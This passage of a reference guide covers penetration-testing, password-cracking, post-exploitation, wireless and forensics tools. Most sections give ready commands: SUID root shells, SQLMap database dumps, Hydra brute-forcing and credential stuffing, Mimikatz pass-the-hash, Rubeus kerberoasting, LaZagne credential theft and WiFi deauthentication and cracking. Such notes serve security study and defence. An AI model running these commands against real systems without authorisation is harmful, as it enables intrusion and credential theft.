```shell
background
use post/linux/gather/hashdump      # load a post-exploit module to list user hashes (from /etc/shadow)
sessions                            # check the session ID of the Meterpreter shell, let's assume it is 2
set session 2
exploit                             # get the hash of all users on the target machine
```


### BeEF (Browser Exploitation Framework)

BeEF is an open-source penetration testing tool focusing on the exploitation of web browsers.  
It is used by ethical hackers, security professionals, and penetration testers to assess the security of web applications and web browsers.  
It can be used to demonstrate various types of attacks that can be carried out through a web browser.

To use BeEF, we first need to hook the target's browser.  
This is done by making their browser execute some malicious JS code by clicking on a malicious link.  
This JS code communicates with the BeEF server and allows communication with it.  

BeEF provides a web-based interface to see all the hooked browsers and interact with them.  
It allows to steal cookies, capture keystrokes, or take screenshots of the hooked browsers.  


### SqlMap

SqlMap is an automated command-line tool to detect and exploit SQL injection vulnerabilities in web applications.  
It attempts many SQL injection techniques on a provided URL to find out if it is vulnerable to any of them.  

If it finds a boolean vulnerability, it means it can append a `AND 1=1` condition to a query and get a response.  
By evaluating boolean queries, it can infer letter by letter the name of any element in the database.  
If a vulnerability is found, SqlMap can use it to detect the DBMS, list database and table names and dump table contents.  
It can also run custom SQL queries if the vulnerability allows it.

```shell
# test many SQLi attacks with the URL GET parameter to see if any is successful 
sqlmap -u http://example.com/search?type=1

# exploit the found vulnerabilities to list the database names
sqlmap -u http://example.com/search?type=1 --dbs

# exploit the found vulnerabilities to list the tables in a database
sqlmap -u http://example.com/search?type=1 -D company --tables

# exploit the found vulnerabilities to dump all rows from a table
sqlmap -u http://example.com/search?type=1 -D company -T users --dump

# test SQLi attacks on a POST request
# Instead of the URL, we provide the POST request in a text file (captured with Burp for example) and the POST parameter to target
sqlmap -r burp_post_request.txt -p tfUPass --dbs
```

### linPEAS.sh (Linux Privilege Escalation Awesome Script)

`linPEAS.sh` is a post-exploitation enumeration tool to identify potential privilege escalation paths on Linux.  
It scans the system for misconfiguration, weak permissions and exploitable binaries.  
It can find SUID/GUID binaries, writable configuration (sudoers / cron jobs / PATH variable...), search for SSH keys...  
It only outputs the potential weaknesses, but does not attempt to exploit them.  
`WinPEAS` is the equivalent for Windows OS.  


### GTFOBins (Get The Fk Out Binaries)

[GTFOBins](https://gtfobins.github.io) is a website catalog of Unix binaries that can be used to break out of restricted shells.  
It provides commands using all these binaries to escalate privileges, bypass security controls or establish persistence.  
It can be used in combination with `linPEAS.sh` to exploit discovered configuration weaknesses.  

For example, if `linPEAS.sh` discovered that `find` and `nmap` binaries have SUID set, GTFOBins provides a command to leverage it to get a root shell :
```shell
# get a root shell with find that has SUID
find . -exec /bin/sh -p \; -quit

# get a root shell with nmap that has SUID
nmap --interactive
  nmap> !sh
```

### Responder

Responder is a command-line tool to poison NetBIOS, LLMNR and mDNS name resolution requests.  
It is a post-exploitation tool, because we need to already be in the internal network to use it.  


### Havij

Havij is an automated SQL Injection tool that helps penetration testers to find and exploit SQL Injection vulnerabilities on a web page.  
It is developed by ITSecTeam, an Iranian security organization.  
The name Havij means "carrot" in Persian language.


### BlackEye

BlackEye is an application on Kali Linux to create a fake login page for popular websites (Facebook, LinkedIn, Paypal...).  
It generates a URL to send to the victim that looks like the original login page.  
When accessed, info about the victim (IP and browser) get displayed in the Kali Linux console running BlackEye.  
When the victim enters his username and password, they are displayed to the console, and the victim is redirected to the real site.


### Caldera

Caldera is an open-source platform developed by MITRE to automate adversary emulation.  
It is built on the MITRE ATT&CK framework, and allows to simulate these attacks in a controlled environment.  

It is a **BAS tool** (Breach and Attack Simulation tool).  
It is designed to mimic the actions of an attacker breaching the network and moving laterally within it.  

It uses an agent installed on the target machines, and automates many types of attacks.  
For example, it can automate a phishing attack, credentials dumping with Mimikatz and lateral movement using the stolen credentials.  

It generates a detailed report of the results that can be analyzed to find the system's vulnerabilities.  


### Infection Monkey

Infection Monkey is another open-source BAS tool (Breach and Attack Simulation) to emulate real-world adversary behaviors.  
It mimics the behavior of an actual malware, but without causing any damage.  

it is made of 2 components :
- the **Monkeys** are agents behaving like a malware that can be configured to spread through the network, steal data and deliver payloads
- the **Monkey Island** is a C2 (Command and Control) server collecting infos about the monkeys to monitor the simulation

The monkeys can be configured to behave like many kinds of malware (worm, ransomware...).  
From the monkey island, we can see the infection spread, which systems got infected and which data are at risk.  


### Atomic Red Team

Atomic Red Team is a library of small focused attack tests that can be run manually or automatically.  
Each test simulates a real-world attacker behavior against a target system.  

Atomic Red Team is based on the MITRE ATT&CK framework, where each atomic attack tests a specific technique.  
For example, some atomic tests can perform privilege escalation. lateral movement, data exfiltration...  
Atomic tests can be invoked with the `Invoke-AtomicTest` PowerShell command.  
The goal is to simulate an attack and ensure that our system can detect it and prevent it.  
Tests are referenced by their MITRE ATT&CK technique reference ans their ID within that technique.  

```shell
# Technique T1003.001 test 1 : simulate an attacker dumping credentials from memory
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Technique T1059.001 test 2 : simulate an attacker executing a malicious PowerShell script
Invoke-AtomicTest T1059.001 -TestNumbers 2

# Technique T1053.005 test 1 : simulate an attacker using a scheduled task to maintain persistence
Invoke-AtomicTest T1053.005 -TestNumbers 1
```



## Password Cracking and Recovery


### Cain and Abel

Cain and Abel is a password recovery tool for Windows that can :
- sniff the network
- crack encrypted passwords (brute-force, dictionary attack)
- record VoIP conversations
- decode scrambled passwords
- reveal password boxes
- analyze routing protocols...


### Hashcat

Hashcat is an offline password recovery and cracking tool.  
It is free and accessible online as a zip folder.

It takes as input a target hash, a hashing method and a list of passwords, and it tries to find one password in the
list that generates this hash.

Hashcat can also perform mask attacks, similar to brute force attacks with constraints (password length, only alpha-numeric, ...).

All hashes found by Hashcat are stored in a _hashcat.potfile_ file.

Hashcat shows a status of `Cracked` if a match was found, `Exhausted` otherwise.  

```shell
hashcat -h                                         # display help
hashcat -a 0 -m 0 hash.txt dict.txt                # try to find a password in a dict that generates a given hash
                                                   #   -m to specify the hashing method (0 : MD5)
                                                   #   -a to specify the attack mode (0 : straight, 1 : combination, 3 : mask)
hashcat -a 1 -m 0 hash.txt dict.txt rockyou.txt    # try to find a password in multiple dicts
hashcat -a 3 -m 0 hash.txt ?l?l?l?l?l?l            # try to find a password following a given mask pattern (6 lower letters)
```

Note : to get the hash for a given string, we can use an online hash tool, the `md5sum` command in Linux or the `Get-FileHash` PowerShell command :
```shell
# Linux
md5sum movie.mp4                                                 # MD5 hash of a file
echo -n "p4ssw0rd" | md5sum                                      # MD5 hash of a string

# PowerShell
Get-FileHash movie.mp4 | Format-List                              # SHA-256 hash (default)
Get-FileHash movie.mp4 -Algorithm MD5 | Format-List               # MD5 hash
```

Hashcat cannot crack a password hashed with the Yescrypt algorithm that is very CPU-intensive (for example the Debian user passwords).  
For Yescrypt hashes, we should use John the Ripper instead.



### John the Ripper

John the Ripper is another password cracking tool, offering similar functionalities as HashCat.  
It comes with a free community edition.

**Jumbo John** is a version of John the Ripper including many patches, enhancements and extensions.  
Jumbo John is pre-installed on Kali Linux, and accessible with the `john` command.  

John the Ripper uses some word lists to crack the passwords.  
A lot of password lists can be found in the [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) GitHub repo.  
In Kali, some word lists are available under `/usr/share/wordlists/`, including :
- `john.lst` : 3'500 most common passwords
- `nmap.lst` : 5'000 common passwords
- `wifite.lst` : 200'000 passwords
- `rockyou.txt` : 14 million leaked passwords

To crack a password with John, we need to specify the type of hash we are cracking (John can guess, but it is unreliable).  
We can use **HashIdentifier** (installed on Kali) to identify the hashing algorithm from a hash, or the suggestion from HashCat.  

```shell
# list all hash formats supported by John
john --list=formats

# crack some hashes in different formats
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hash.txt            # NTLM (windows account)
```
#### John Modes

The `--wordlist` mode is shown above and tries to hash a list of passwords and find a match.  

The `--single` mode targets a specific user, using word mangling to try to guess easy passwords.  
If we know that the username is `simon`, it could find a password like `Sim0n` for example.  
To use the single mode, the hash needs to be prefixed with the username, for example `simon:ef872391c15c22d8f5c41e91e2756360`.  
We can create custom rules to transform the username in `/etc/john/john.conf`.

The `--incremental` mode is used to brute-force all combinations of characters.  
```shell
john --incremental --format=raw-md5 --max-length=6 hash.txt
```

#### John rules

John allows the creation of custom rules, to try variations of passwords in the word list.  
The rules can be edited and added in the `/etc/john/john.conf` configuration file.  

In the rule pattern, we use :
- `A` : position of the original password
- `c` : try to capitalize the first letter
- `0[<characters>]` : prefix the word with a character among the list
- `z[<characters>]` : suffix the word with a character among the list

An example of custom rule that tries to capitalize and add a number or a special character or both is :
```shell
[List.Rules:MyRule]
cAz"[0-9]" 
cAz"[0-9][0-9]" 
cAz"[£!$]" 
cAz"[0-9][£!$]"
```

The rule can be specified with the `--rules=<RULES_NAME>` parameter, for example :
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 --rules=MyRule hash.txt
```

Some rules are defined by default in the John config file and can be used out-of-the-box :
- `--rules=Single` : a lot of transformations for single-crack mode (based on user-specific words)
- `--rules=Wordlist` : common transformations to a base wordlist


#### Cracking Linux passwords

John the Ripper can also crack the password from Linux users.  
The password hashes are stored under `/etc/shadow`, each line contains a comma-separated list of values : 
```shell
tommy:$y$j9T$76aaae1$/OOSg64wefdehgtVPdzqiFang6uZA4QA1pzzegKdVm4:19965:0:99999:7:::

tommy : username
y : hashing algorithm (yescrypt)
j9T : parameter sent to the hashing algorithm
76aaae1 : salt
/OOSg64wefdehgtVPdzqiFang6uZA4QA1pzzegKdVm4 : password hash
```

They can be cracked with :
```shell
# Create a user and set its password
useradd -r user2
passwd user2

# crack the password for user2 (assuming it is yescrypt hash recognized with the $y$ prefix)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt /etc/shadow
```

#### John conversion tools

Some passwords need to be converted to a John-specific format to be cracked by John.  
John exposes many conversion tools for common formats called `***2john`, listed when starting John in Kali.  

A few example of conversion tools are :
- `zip2john` for password-protected ZIP archives
- `rar2john` for password-protected RAR archives
- `ssh2john` for passphrase-protected SSH keys
- `pdf2john.pl` for password-protected PDF files

```shell
# create a ZIP hash file and crack it with John
zip2john test.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

# create a RAR hash file and crack it with John
rar2john test.zip > rar_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt

# create a openSSH hash file and crack it with John
ssh2john id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```


### CrackStation.net

[https://crackstation.net](https://crackstation.net) is a website for cracking unsalted hashes.  
It keeps a database of billions of hashes and their original values for common hashing methods (MD5, SHA1, SHA-256, ...).  
It can detect automatically the hashing method used and give the original value for up to 20 hashes at a time.


### Crunch

Crunch is a utility that generates a custom word list based on a syntax template to provide to a password cracker.  
We can specify the password min and max size and the allowed characters, and Crunch generates all possibilities.  
We can use placeholders `%` for a digit, and `@` for a lower-case character.  
Crunch is available by default in Kali Linux.

```shell
# generate the pins.txt file containing all possible PIN numbers of 4 to 6 digits
crunch 4 6 0123456789 -o pins.txt

# generate in the terminal all passwords of size 10 starting with "password" and ending with 2 digits
crunch 10 10 -t password%%

# generate all password of size 6 starting with "pass" and ending with 2 lower-case letters
crunch 6 6 -t pass@@ -o list.txt
```


### CeWL (Custom Word List)

CeWL is another custom word list generator that uses the content of a website to create its word list.  
It is a Ruby app that spiders a given URL up to a specific depth to capture the words for its list.  
Its generated file can then be used with password crackers like **John the Ripper** or **Wfuzz**.

```shell
# generate a word list and an emails list from a website with depth 2 and min word length 5
cewl -d 2 -m 5 -w passwords.txt http://10.10.131.23 --email --email_file emails.txt
```


### RSMangler

RSMangler is a command-line program to generate a richer list of passwords from a given list of words.  
It creates the new passwords by applying some transformation rules to the original words.  
For example it can add numbers at the end, capitalize the word, adding special characters, using leet replacements...  
By default, all mangling options are ON, and they can be turned OFF via command-line options.

```shell
# create a list of passwords from a list of words, with a few transformations disabled :
#  -a    : create an acronym with all words  
#  -c    : capitalize each word
#  --pnb : add 01-09 at the beginning of each word
#  --nb  - add 1-123 at the beginning of each word
rsmangler -a -c --pnb --nb --file words.txt --output passwords.txt
```


### Hydra

Hydra is an open-source password brute-forcing tool for online brute-force attacks.  
It operates via network protocols like SSH, RDP, HTTP (GET/POST), HTTP-FORM (GET/POST)...  
It sends the login attempts one-by-one to the target and checks the response for success.

Unlike Hashcat or John the Ripper, it is not an offline password cracking tool.  
It does not check passwords against a target hash, but against a target network system (so it can be detected).  
For common protocols, it can detect automatically if an attempt is successful or not.  
For HTTP login against a custom website, it needs to know the message to expect in case of failure.  

Hydra has a GTK+ based GUI version called `hydra-gtk`.

```shell
# brute-force attack of all passwords from 4 to 8 alpha-numeric characters 
hydra -l testuser -x 4:8:abcdefghijklmnopqrstuvwxyz1234567890 ssh://<TARGET_IP>

# try all passwords in a word list to access the target IP in SSH with a given user (login)
# -f to stop when a valid password is found
# -v for verbose logging
hydra -l testuser -P rockyou.txt -f -v <TARGET_IP> ssh

# try all passwords in a word list to access the target IP on a given HTML form
# no user is needed to access, only a password, added to the POST body with the ^PASS^ placeholder
# we specify the login PHP page, the fields in the POST body, and the message on error (separated with ":")
hydra -l '' -P pins.txt -f -v 10.10.131.34 http-post-form "/login.php:pin=^PASS^:Access Denied" -s 8000

# try all passwords from a word list to authenticate as a given user to a HTML form
# similar to the previous example, but with a user, that is added to the POST body with the ^USER^ placeholder
hydra -l testuser -P rockyou.txt 10.10.131.34 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"

# credential stuffing attack, using a list of users and their corresponding password from a previous breach
# hydra can try each credentials pair and report the successful ones
hydra -L usernames.txt -P passwords.txt 10.10.131.34 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
```


### Medusa

Medusa is an alternative to Hydra to crack passwords for online services.  
Just like Hydra, it supports a variety of services (SSH, FTP, HTTP...).  
It is slightly slower than Hydra, but it supports parallel attack on multiple target hosts.  

```shell
# dictionary attack on an FTP account
medusa -h <TARGET_IP> -u testuser -P rockyou.txt -M ftp
```


## Post-Exploitation Tools


### PowerShell Empire

Empire is a popular post-exploitation and C2 framework used in red teaming.  
It allows attackers to maintain access, escalate privileges and perform lateral movement.  
It is used a lot in CTF and red teaming labs, but less in real penetration testing due to its growing detection signature.  

Empire lets us run PowerShell agents without the need for PowerShell.exe, to evade detection.  
On a local attacking machine, we can start the Empire server, a listener waiting for a target to connect :
```shell
uselistener http set Host http://<ACCTACKER_IP> execute
```
We then need the target to connect to this Empire server.  
Empire can generate a stager payload in multiple formats.  
The attacker needs to find a way to deliver this payload and execute it on the target machine (phishing, USB drop, remote exploit...).  
Once executed, this stager connects to the Empire server to download the full Empire agent that allows remote control.  

For example, for credentials harvesting using Mimikatz :
```shell
usemodule credentials/mimikatz/logonpasswords execute
```


### PowerSploit

PowerSploit is a collection of PowerShell scripts designed to perform various tasks during the post-exploitation phase.  
It is used after initial access to a target machine to run malicious code, escalate privilege, extract passwords...  

PowerSploit uses PowerShell that is installed by default on every Windows machine.  
It has various modules, like `Invoke-Mimikatz` to dump passwords from memory, or `Invoke-MS16-032` to exploit vulnerabilities to escalate privileges.  

PowerSploit contains the **PowerView** tool used for AD enumeration.  
It can map an AD environment, including users, groups, computers and the relationship between them.

```shell
Get-NetUser                                    # identify all AD users in the domain
                                               # (can identify high-privilege or rarely used users)
Get-NetGroup                                   # list all AD groups in the domain
Get-NetGroupMember -GroupName "<GROUP_NAME>"   # find users in a group
Get-NetComputer                                # identify computers on the AD domain
Get-NetDomainTrust                             # show trust relationship between this domain and other domains
Get-NetSession -ComputerName <COMPUTER_NAME>   # show who is currently logged to a specific computer
```

PowerSploit is no longer supported by its developers, so it is rarely used in real-life penetration testing.  


### PowerUpSQL

PowerUpSQL is a collection of PowerShell scripts to automate the discovery and exploitation of SQL servers.  

```shell
Get-SQLInstanceLocal -Verbose                      # enumerate the SQL server instances on the local network   
Get-SQLDomainUser -UserState SmartCardRequired     # enumerate users configured to require a smartcard for login (to avoid them)    
Get-SQLDomainUser -UserState TrustedForDelegation  # enumerate users who can impersonate other users (good targets for privilege escalation)
Get-SQLServerInfo -Instance "SQLSERVER01"          # get info about a SQL server instance (version, users, roles...)
Get-SQLServerLoginDefaultPw  -Verbose              # identify SQL server instances using default credentials
Invoke-SQLEscalatePriv -Instance "SQLSERVER01"     # attempt to escalate privilege on an SQL server instance
```


### CrackMapExec (CME)

CrackMapExec is a post-exploitation tool used for network enumeration, credential validation an lateral movements on Windows target machines.  
It is also used to automate credential-based attacks, like password spraying or pass-the-hash attacks on services supporting authentication by hash.

CrackMapExec is no longer maintained, so its effectiveness is decreasing over time.  
Its maintainer retired in 2023, and the main remaining contributors created **NetExec** as its successor.

```shell
# enumerate SMB shares
crackmapexec smb 192.168.1.0/24 --shares

# check for SMB guest access
crackmapexec smb 192.168.1.10 -u '' -p ''

# authenticate with SMB credentials to validate them
crackmapexec smb 192.168.1.10 -u testuser -p qwerty

# password spraying of a single password against several users and/or hosts on the SMB service
crackmapexec smb <TARGET_IP_OR_RANGE> -u users.txt -p qwerty

# pass the hash attack : log in using a hash and run a command prompt on the target
crackmapexec smb <TARGET_IP> -u testuser -H <HASH>

# execute a command over SMB (require Administrator privileges)
crackmapexec smb <TARGET_IP> -u testuser -p qwerty -x 'ipconfig'

# dump SAM hashes over SMB (require SYSTEM privileges, above Administrator)
crackmapexec smb <TARGET_IP> -u testuser -p qwerty --sam
```


### Mimikatz

Mimikatz is an open-source post-exploitation tool to extract authentication credentials from a Windows target machine.  
It is used to extract NTLM hashes and Kerberos tickets from the target's memory.

```shell
# extract the NTLM hashes from memory
 mimikatz # sekurlsa::logonpasswords

# dump all password hashed from the SAM database
mimikatz # lsadump::sam

# pass-the-hash attack to access the administrator account from a dumped hash
mimikatx # sekurlsa:pth /user:Administrator /domain:example.com /ntlm:<ADMIN_HASH> /run:cmd.exe

# extract from memory the Kerberos tickets present on the machine
mimikatz # kerberos::list /export
```


### Rubeus

Rubeus is a post-exploitation tool to interact with Kerberos authentication in Windows environments.  
It requires administrative privileges and often Domain admin or SYSTEM right for some of its attacks.  

Rubeus can be used to :
- extract and reuse Kerberos tickets (pass-the-ticket attack)
- kerberoasting to extract service account password
- forging Kerberos tickets
- requesting TGT using plaintext passwords or NTLM hashes

Rubeus is often flagged by antivirus solutions.  
To avoid detection, we can use an obfuscated version or run it in memory using Cobalt Strike or execute-assembly in Meterpreter.  

```shell
# extract Kerberos tickets from memory (need admin right)
.\Rubeus.exe dump

# Kerberoast to extract service account passwords (require domain user right)
.\Rubeus.exe kerberoast /format:hashcat
hashcat -m 13100 -a 0 kerberoast_hashes.txt
```


### Seatbelt 

SeatBelt is a C# tool performing several security checks on Windows systems that can be exploited for privilege escalation.  
It automates the detection of systems misconfiguration.

```shell
# enumerate all available checks
Seatbelt.exe all

# check for high-integrity processes (Administrator or Systems permissions)
Seatbelt.exe -group=checkselevated

# list auto-run executables
Seatbelt.exe autoruns
```


### PowerShell ISE (Integrated Scripting Environment)

PowerShell ISE is a user-friendly GUI script development environment for PowerShell.  
It is available by default on Windows machines and can be used to easily run PowerShell commands to elevate privileges.


### LaZagne

[LaZagne](https://github.com/AlessandroZ/LaZagne) is an open-source Python post-exploitation tool to recover stored credentials from various applications.  
It can recover credentials stored in browsers, in Git or Wifi access codes.  
It is available for Windows, Linux and Mac.

```shell
# install LaZagne from source
git clone <REPO>
cd LaZagne
python3 -m venv myvenv
source myvenv/bin/activate
pip3 install -r requirements.txt

# retrieve credentials stored in browsers
python3 LaZagne.py browsers

# retrieve wifi passwords
python3 LaZagne.py wifi

# cleanup the venv
deactivate
rm -rf myvenv
```


## Wireless Tools


### Aircrack-ng

Aircrack-ng is an open-source suite of software tools used for assessing and testing the security of Wifi networks.  
It can capture packets on a wireless network and crack poorly secured Wifi passwords.  
It is available by default in the Kali Linux distribution.

For example, Aircrack-ng can crack a WEP password in a few minutes by IV attack.    

To use aircrack-ng on a network interface, this interface must be in monitor mode.  
This allows it to receive all traffic, even packets not intended for it.  
Some network cards allow monitor mode, but they would default to normal mode discarding all traffic intended to other devices.

```shell
# using the ip / iw commands
sudo ip link set wlan0 down                 # turn down the wlan0 interface
sudo iw dev wlan0 set type monitor          # change the interface type to monitor
sudo ip link set wlan0 up                   # turn the interface back up, it should be renamed to wlan0mon

# alternatively we can use airmon-ng to set an interface in monitor mode
airmon-ng start wlan0
```

Once we have a wireless network interface wlan0mon in monitor mode, we can scan for wireless networks :

```shell
# list wireless networks accessible by a network interface, with all its data :
# BSSID / power / number of beacons received / number of packets received / encryption / channel / ESSID (network name)
airodump-ng wlan0mon

# Start capturing the traffic on the target wireless network and save it to a file
airodump-ng --channel <CHANNEL> --bssid <BSSID> --write MyHackedTraffic wlan0mon

# force an authenticated client to deconnect, so we can capture its reconnection traffic
# authenticated clients are listed by airdump-ng
aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# Keep above command running and in another terminal send an auth request
aireplay-ng --fakeauth 0 -a <BSSID> -h <wlan0mon MAC ADDRESS> wlan0mon

# Get some ARP messages
aireplay-ng --arpreplay -b <BSSID> -h <wlan0mon MAC ADDRESS> wlan0mon 

# Crack the network using the IVs from the captured traffic
# It will try to infer the WEP key from all captured IVs
# It may fail if not enough data, it reruns every 5000 data captured by the scan 
aircrack-ng MyHackedTraffic.cap

# try to crack the WPA/WPA2 key using a wordlist
aircrack-ng -w <WORDLIST> -b <BSSID> MyHackedTraffic.cap 
```


### Reaver / wash

**Reaver** is a command-line tool to crack the access code for WPA Wifi routers with WPS enabled.  
It brute-forces the WPS handshaking process to crack WPA networks.  
It usually takes several hours to complete the attack.

`wash` is Reaver's custom wireless network scanner.  
It is similar to `airodump-ng`, but it also shows which networks have WPS enabled.  

```shell
# set the wireless network interface to monitor mode
airmon-ng start wlan0

# scan for WPA networks with WPS enabled
wash -i wlan0mon

# attempt to crack the WPS PIN code
reaver -i wlan0mon -c <CHANNEL> -b <BSSID> -vv
```


### Bully

Bully is an alternative to Reaver to crack a WPS enabled WPA network.  

It can also be used when we know the PIN from Reaver to find the network password. 

```shell
# get the Wifi password when we already know the WPS PIN
bully -i wlan0mon -b <BSSID> -c <CHANNEL> -p <PIN>
```


### Wifi-Pumpkin

Wifi-Pumpkin is a framework written in Python to create a fake access point fo an evil twin attack.  
It can clone the SSID of a target network, create a phishing portal and manipulate DNS settings to redirect the victim.


### Kismet

Kismet is an open-source wireless network detector, packet sniffer and intrusion detection system.  
It supports multiple protocols, like Wifi, Bluetooth, Zigbee...  
It is often used during the reconnaissance phase of a penetration test to gather information about the wireless environment.  

Kismet works in passive mode, it does not interact with the network.  
It even shows hidden SSIDs, like rogue access points or corporate networks, by sniffing the beacons and packets exchanged.  

Kismet can capture packets for further analysis with WireShark.


## Forensics Tools


### FTK Imager (Forensic Tool Kit Imager)

FTK Imager is used to create a copy of a hard drive or a USB thumbdrive as a sequence of files.  
It is a GUI-based program for Windows.  
These files have the `.dd` extension, a format compatible with multiple forensic tools.

FTK Imager can then open the drive copy and analyze it.  
It shows all the files of the drive, even the deleted ones, which can sometimes be recovered.


### Autopsy

Autopsy is an open-source digital forensics platform.  
It offers a graphical interface to the Sleuth toolkit, and adds other digital forensics tools.  

Its imaging function relies on `dd`, and its analysis function relies on the Sleuth toolkit.


### Volatility

Volatility is a command-line tool used by digital forensics and incident response teams to analyze a memory dump.  
It is a Python program called `vol.py` that can analyze memory snapshots from Linux, MacOS and Windows.

It has 2 main versions, **vol2** using Python 2 that is deprecated, and its successor **vol3** using Python 3.

Its main functions are :
- list active and closed network connections
- list running processes
- list command line history
- extract malicious processes for later analysis

Vol2 needs to be provided with the profile of the machine from which the memory dump was generated.  
It is required to know the memory structure of the OS, so Volatility can make sense of the dump.  
Windows profiles are available by default (see list with `vol.py --info`).  
Linux profiles must be created by the user and added to the local Volatility Linux profiles folder.  
Vol3 does not need a memory profile.

Volatility takes the plugin to apply to the dump, defining what it needs to check inside the memory dump.  

```shell
vol.py -h                   # display help
vol.py --info               # display all profiles, commands, plugins...

# Vol2 with some linux plugins
vol.py -f linux.mem --profile="VistaSP0x64" linux_bash     # check command history file
vol.py -f linux.mem --profile="VistaSP0x64" linux_pslist   # check running processes
vol.py -f linux.mem --profile="VistaSP0x64" linux_procdump -D <OUTPUT_FOLDER> -p <PID>  # extract binary of a process

# Vol3 with some windows plugins
vol3 -f wcry.mem windows.pstree.PsTree         # list running processes in a tree structure
vol3 -f wcry.mem windows.pslist.PsList         # similar to PsTree but list all running processes in a list
vol3 -f wcry.mem windows.cmdline.CmdLine       # display the command line arguments of running processes
vol3 -f wcry.mem windows.malfind.Malfind       # list process memory range potentially containing injected code
```


### Cuckoo

Cuckoo is an open-source software to automate the analysis of suspicious files.  
It is basically a sandbox where we can put a suspicious file and observe its behavior.


### WinHex

WinHex is a commercial disk editor and universal hexadecimal editor for Windows.  
It is used for digital forensics and data recovery.

WinHex allows users to view, edit, and analyze binary data on various types of storage media, including hard drives, USB drives, memory cards...  
It offers a wide range of features for examining and manipulating data at a low level.


### oledump.py

`oledump.py` is a Python tool to analyze Microsoft OLE2 files (Object Linking and Embedding) like `.doc`, `.xls`, `.ppt`...  
This tool is a valuable forensics tool to extract malicious macros from these types of files.  

```shell
# display the different data streams inside the file (sheets, macros...)
# the data streams with a M symbol are VBA macros 
./oledump.py file.xlsm

# Display details about a specific data stream as a hex dump
./oledump.py -s 4 file.xlsm

# Display details about a specific VBA macro and decompress it to make it readable
./oledump.py -s 4 --vbadecompress file.xlsm
```


### CAPA (Common Analysis Platform for Artifacts)

CAPA is a tool used in cyber-security and incident response.  
It performs **static analysis** on an executable file to identify its behavior and capabilities without executing it.  
It applies a set of rules to the executable file to understand its behavior : network communication, file manipulation, process injection...

CAPA splits all its rules into a hierarchy of namespaces.  
For each lower-level namespace, CAPA has one or more rules, represented by a YAML file (one YAML per rule).  

```shell 
capa.exe my_executable.bin -vv
```

The output of a CAPA analysis contains :
- the hash of the file with common hashing methods (MD5 / SHA-1 / SHA-256)
- the tactics and techniques from the MITRE ATT&CK framework identified in the binary
- some MAEC key/value pairs describing the malware (Malware Attribute Enumeration and Characterization), for example "launcher" or "downloader"
- the MBC objectives and behaviors (Malware Behavior Catalog)
- flagged capabilities (rules) and their namespace

By increasing the verbose level with `-v` or `-vv`, we can display which part of each rule was matched.  
This generates a huge output, so we can use the **CAPA Explorer Web** tool to load the JSON output file and display it interactively.


### DNSpy (DotNet Spy) / ILSpy (Intermediate Language Spy)

DNSpy is an open-source tool for Windows designed for the analysis and editing of .NET assemblies.  
It is commonly used for reverse engineering, debugging, and modifying .NET applications. 

ILSpy is a lightweight cross-platform .NET decompiler focused on simplicity.  
It is easier to use than DNSpy when only decompilation is required or when we use Linux or MacOS.


### FLOSS (FLARE Obfuscated String Solver)

[FLOSS](https://github.com/mandiant/flare-floss) is a tool to extract and deobfuscate strings from malware.  
It is an improvement of the default `strings.exe` on Windows that extracts strings from a binary, but cannot extract obfuscated strings.  

A common way for malware to avoid detection is to execute a base64-encoded command in Powershell with `powershell -EncodedCommand <BASE64_COMMAND>`  
This way, the malware binary does not contain a readable string of the actual command.  
FLOSS can decode them, as well as strings constructed on the stack.


### CyberChef

[CyberChef](https://gchq.github.io/CyberChef/) is a versatile web-based tool performing a wide range of data manipulation operations.  
It is very useful in cyber-security, forensics and data analysis.

It provides a user-friendly GUI where we can drag-n-drop one or more available transformations, called recipes.  
We can paste the input data (string or file) in the input section, "bake" the data and see the result in the output section.

CyberChef can be downloaded and started locally, to avoid the upload of sensitive data on the internet.

Among its many available operations, CyberChef can :
- encode/decode messages in morse/base64/URL/hex/binary...
- extract IP addresses, email addresses or URLs from a text
- extract EXIF data from an image
- apply encryption and hashing algorithms (Caesar, AES, SHA, MD5...)
- parse and decode JWT (JSON Web Token)
- identify file type using its magic byte
- auto-detect the transformation to apply with its "magic" recipe


### Frida

Frida is an open-source dynamic instrumentation toolkit for developers, reverse engineers and security researchers.  
It allows to inject custom Javascript or Python scripts into applications to inspect or modify their behavior.  
It is supported on Windows, macOS, Linux, iOS and Android.

Frida is installed with `pip install frida-tools`.

We use the `frida-trace` command to generate the stubs for common library calls :
```shell
frida-trace ./main -i '*'
```

This starts the program, and generates the Javascript stubs under the `__handlers__` folder.  
We can modify these stubs to log or modify the input/output of each function call, for example :
```javascript
defineHandler({
  onEnter(log, args, state) {
    log("PARAMETER:" + args[0]);                       // int param
    log("PARAMETER:" + Memory.readCString(args[1]));   // string param
  },

  onLeave(log, retval, state) {
    log("return value: " + retval);
    retval.replace(ptr(1))                              // modify the return value
  }
});
```

Frida can be used to hack video games or other programs by intercepting and modifying calls to libraries.


### INetSim (Internet Services Simulation Suite)

INetSim is a network service simulator designed to analyze the behavior of malware in a controlled environment.  
It provides simulated versions of common network services, so the malware can use them and its behavior can be analyzed.  
INetSim can simulate HTTP, HTTPS, DNS, FTP, SMTP, POP3...

INetSim's configuration in `/etc/inetsim/inetsim.conf` lets us configure which services should be simulated.  
We can then start the simulated services with the `sudo inetsim` command.  
When we try to use a simulated service (for example using wget on an HTTPS address), INetSim will return a fake file.

INetSim also generates a report on the captured connection attempt in `/var/log/inetsim/report/`.


### REMnux VM

REMnux is a specialized Linux distribution for network forensics, reverse-engineering and Linux/cross-platform malware analysis.    
It includes tools like Volatility, YARA, WireShark, INetSim, oledump.py, local CyberChef...
It provides a sandbox-like environment where we can run the analyzed binary without risking damaging our system.


### Flare VM (Forensics, Logic Analysis and Reverse Engineering)

FlareVM is a Windows-based virtual machine for reverse-engineering, crafted by FireEye.  

